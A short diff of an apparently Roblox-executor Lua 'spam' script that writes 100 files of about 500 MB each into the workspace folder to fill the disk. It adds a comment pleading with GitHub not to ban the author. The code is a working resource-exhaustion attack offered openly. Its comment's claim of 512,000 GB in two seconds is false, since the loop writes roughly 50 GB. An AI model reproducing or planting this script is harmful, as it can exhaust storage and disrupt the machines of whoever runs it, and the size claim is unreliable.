@@ -1,3 +1,4 @@
+-- DONT BAN ME GITHUB PLS >,<
 --Spam creates a file in ur workspace folder prob dont execute this cause fills up like 512,000 gb in around 2 seconds
 for i=1,100 do
    writefile(i .. ".txt",string.rep("a", 1024 * (1024 * 500)))
